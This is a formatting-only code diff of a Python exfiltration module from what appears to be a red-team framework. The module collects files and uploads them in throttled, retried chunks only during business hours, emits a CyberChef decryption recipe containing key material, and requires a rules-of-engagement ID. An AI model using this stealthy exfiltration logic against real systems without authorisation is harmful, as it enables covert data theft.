@@ -18,6 +18,7 @@ Design constraints:
   - All staging paths registered with cleanup.py before first write.
   - FORGE_OFFLINE_STRICT=1 suppresses all upload operations.
 """
+
 from __future__ import annotations
 
 import asyncio
@@ -34,17 +35,18 @@ from forge.db.direct_connect import direct_connect  # noqa: E402  # PRAGMA-confi
 
 _LOG = logging.getLogger(__name__)
 
-DEFAULT_RATE_BYTES_PER_SEC = 50 * 1024   # 50 KB/s
-DEFAULT_CHUNK_SIZE          = 4 * 1024 * 1024  # 4 MB
-DEFAULT_WINDOW_START        = dtime(9, 0)
-DEFAULT_WINDOW_END          = dtime(17, 0)
+DEFAULT_RATE_BYTES_PER_SEC = 50 * 1024  # 50 KB/s
+DEFAULT_CHUNK_SIZE = 4 * 1024 * 1024  # 4 MB
+DEFAULT_WINDOW_START = dtime(9, 0)
+DEFAULT_WINDOW_END = dtime(17, 0)
 
 
 # ── Time-window enforcement ────────────────────────────────────────────────────
 
+
 def _check_time_window(
     window_start: dtime = DEFAULT_WINDOW_START,
-    window_end:   dtime = DEFAULT_WINDOW_END,
+    window_end: dtime = DEFAULT_WINDOW_END,
 ) -> None:
     """Block exfil outside operator-configured time window."""
     now = datetime.now().time()
@@ -58,6 +60,7 @@ def _check_time_window(
 
 # ── Rate throttle ─────────────────────────────────────────────────────────────
 
+
 class ThrottledUploader:
     """
     Rate-limited channel uploader. Caps upload speed to max_bytes_per_sec.
@@ -68,13 +71,13 @@ class ThrottledUploader:
         self,
         channel,
         max_bytes_per_sec: int = DEFAULT_RATE_BYTES_PER_SEC,
-        chunk_size:        int = DEFAULT_CHUNK_SIZE,
-        max_retries:       int = 3,
+        chunk_size: int = DEFAULT_CHUNK_SIZE,
+        max_retries: int = 3,
     ) -> None:
-        self._channel  = channel
-        self._rate     = max_bytes_per_sec
+        self._channel = channel
+        self._rate = max_bytes_per_sec
         self._chunk_sz = chunk_size
-        self._retries  = max_retries
+        self._retries = max_retries
 
     def upload(self, data: bytes) -> bool:
         """Upload data in rate-limited chunks. Returns True if all chunks succeeded."""
@@ -83,7 +86,7 @@ class ThrottledUploader:
             _LOG.debug("FORGE_OFFLINE_STRICT: upload suppressed.")
             return False
 
-        chunks  = [data[i:i + self._chunk_sz] for i in range(0, len(data), self._chunk_sz)]
+        chunks = [data[i : i + self._chunk_sz] for i in range(0, len(data), self._chunk_sz)]
         success = True
 
         for idx, chunk in enumerate(chunks):
@@ -93,8 +96,10 @@ class ThrottledUploader:
                 if self._channel.send(chunk):
                     sent = True
                     break
-                wait = min(2 ** attempt, 32)
-                _LOG.debug("Upload chunk %d failed (attempt %d); retry in %ds", idx, attempt+1, wait)
+                wait = min(2**attempt, 32)
+                _LOG.debug(
+                    "Upload chunk %d failed (attempt %d); retry in %ds", idx, attempt + 1, wait
+                )
                 time.sleep(wait)
 
             if not sent:
@@ -103,7 +108,7 @@ class ThrottledUploader:
                 continue
 
             # Rate throttle: sleep to maintain target bytes/sec
-            elapsed  = time.monotonic() - start
+            elapsed = time.monotonic() - start
             expected = len(chunk) / self._rate
             if expected > elapsed:
                 time.sleep(expected - elapsed)
@@ -117,6 +122,7 @@ class ThrottledUploader:
 
 # ── CyberChef recipe emitter ───────────────────────────────────────────────────
 
+
 def emit_cyberchef_recipe(session_key_hex: str, output_path: Path) -> None:
     """
     Write a CyberChef decryption recipe for operator-side verification.
@@ -124,22 +130,25 @@ def emit_cyberchef_recipe(session_key_hex: str, output_path: Path) -> None:
     Key is sensitive — register output with cleanup.py immediately.
     """
     recipe = {
-        "op":   "AES Decrypt",
+        "op": "AES Decrypt",
         "args": {
-            "key":   {"option": "Hex", "string": session_key_hex},
-            "iv":    {"option": "Hex", "string": ""},
-            "mode":  "GCM",
+            "key": {"option": "Hex", "string": session_key_hex},
+            "iv": {"option": "Hex", "string": ""},
+            "mode": "GCM",
             "input": "Raw",
-        }
+        },
     }
     steps = [
         recipe,
         {"op": "Gunzip", "args": []},
     ]
     output_path.write_text(json.dumps(steps, indent=2), encoding="utf-8")
-    _LOG.info("CyberChef recipe written: %s (contains key material — clean up post-op)", output_path)
+    _LOG.info(
+        "CyberChef recipe written: %s (contains key material — clean up post-op)", output_path
+    )
     try:
         from forge.shared.cleanup import register_cleanup_file
+
         register_cleanup_file(output_path)
     except ImportError:
         pass
@@ -147,10 +156,11 @@ def emit_cyberchef_recipe(session_key_hex: str, output_path: Path) -> None:
 
 # ── ExfilMonitor registration ──────────────────────────────────────────────────
 
+
 def register_exfil_monitor(
-    db_path:       Path,
+    db_path: Path,
     engagement_id: int,
-    sha256_list:   list[str],
+    sha256_list: list[str],
 ) -> None:
     """
     Register collected file SHA-256 hashes with ExfilMonitor for paste-site surveillance.
@@ -167,7 +177,10 @@ def register_exfil_monitor(
             )
         con.commit()
         con.close()
-        _LOG.info("ExfilMonitor: registered %d SHA-256 hashes for paste-site monitoring.", len(sha256_list))
+        _LOG.info(
+            "ExfilMonitor: registered %d SHA-256 hashes for paste-site monitoring.",
+            len(sha256_list),
+        )
     except sqlite3.OperationalError:
         _LOG.debug("exfil_monitor_targets table not present — skipping ExfilMonitor registration.")
 
@@ -178,7 +191,9 @@ from forge.utils.post.collectors import COLLECTOR_REGISTRY
 
 
 def _require_roe(roe_id: str | None, *, action_name: str) -> str:
-    normalized = " ".join(str(roe_id or os.environ.get("FORGE_ROE_ID", "") or "").strip().split())[:160]
+    normalized = " ".join(str(roe_id or os.environ.get("FORGE_ROE_ID", "") or "").strip().split())[
+        :160
+    ]
     if not normalized:
         raise RuntimeError(f"{action_name} requires roe_id or FORGE_ROE_ID before live execution.")
     return normalized
@@ -202,36 +217,36 @@ class Exfiltrator:
 
     def __init__(
         self,
-        db_path:       Path,
+        db_path: Path,
         engagement_id: int,
         channel,
-        session_key:   str   = "REPLACE_BEFORE_DEPLOY_32_BYTE_KEY",
-        rate:          int   = DEFAULT_RATE_BYTES_PER_SEC,
-        chunk_size:    int   = DEFAULT_CHUNK_SIZE,
-        window:        Optional[tuple[dtime, dtime]] = (DEFAULT_WINDOW_START, DEFAULT_WINDOW_END),
-        staging_dir:   Optional[Path] = None,
-        stagger:       float = 2.0,
-        dry_run:       bool  = False,
-        roe_id:        str | None = None,
+        session_key: str = "REPLACE_BEFORE_DEPLOY_32_BYTE_KEY",
+        rate: int = DEFAULT_RATE_BYTES_PER_SEC,
+        chunk_size: int = DEFAULT_CHUNK_SIZE,
+        window: Optional[tuple[dtime, dtime]] = (DEFAULT_WINDOW_START, DEFAULT_WINDOW_END),
+        staging_dir: Optional[Path] = None,
+        stagger: float = 2.0,
+        dry_run: bool = False,
+        roe_id: str | None = None,
     ) -> None:
-        self._db_path       = db_path
+        self._db_path = db_path
         self._engagement_id = engagement_id
-        self._channel       = channel
-        self._session_key   = session_key
-        self._rate          = rate
-        self._chunk_size    = chunk_size
-        self._window        = window
-        self._staging_dir   = staging_dir
-        self._stagger       = stagger
-        self._dry_run       = dry_run
-        self._roe_id        = roe_id
-        self._uploader      = ThrottledUploader(channel, rate, chunk_size)
+        self._channel = channel
+        self._session_key = session_key
+        self._rate = rate
+        self._chunk_size = chunk_size
+        self._window = window
+        self._staging_dir = staging_dir
+        self._stagger = stagger
+        self._dry_run = dry_run
+        self._roe_id = roe_id
+        self._uploader = ThrottledUploader(channel, rate, chunk_size)
 
     def run(
         self,
         collector_type: str,
-        emit_recipe:    bool = False,
-        validate:       bool = False,
+        emit_recipe: bool = False,
+        validate: bool = False,
         **collector_kwargs,
     ) -> list[str]:
         """
@@ -264,7 +279,9 @@ class Exfiltrator:
         for artifact in collector.discover():
             collected_file = collector.collect(artifact)
             if collected_file:
-                _LOG.info("Collected: %s (%d bytes)", collected_file.path, collected_file.size_bytes)
+                _LOG.info(
+                    "Collected: %s (%d bytes)", collected_file.path, collected_file.size_bytes
+                )
                 collected_hashes.append(collected_file.sha256)
 
                 if not self._dry_run:
@@ -306,6 +323,7 @@ class Exfiltrator:
             window_text = f"{self._window[0]}–{self._window[1]}"
         try:
             import questionary
+
             confirmed = questionary.confirm(
                 f"[Module 5-H] Exfiltration:\n"
                 f"  Collector  : {collector_type}\n"
@@ -323,16 +341,15 @@ class Exfiltrator:
     def _build_collector(self, collector_type: str, **kwargs):
         if collector_type not in COLLECTOR_REGISTRY:
             raise ValueError(
-                f"Unknown collector: {collector_type!r}. "
-                f"Available: {sorted(COLLECTOR_REGISTRY)}"
+                f"Unknown collector: {collector_type!r}. Available: {sorted(COLLECTOR_REGISTRY)}"
             )
         cls = COLLECTOR_REGISTRY[collector_type]
         collector = cls(
-            db_path       = self._db_path,
-            engagement_id = self._engagement_id,
-            session_key   = self._session_key,
-            staging_dir   = self._staging_dir,
-            stagger       = self._stagger,
+            db_path=self._db_path,
+            engagement_id=self._engagement_id,
+            session_key=self._session_key,
+            staging_dir=self._staging_dir,
+            stagger=self._stagger,
             **kwargs,
         )
         if hasattr(collector, "configure_execution"):
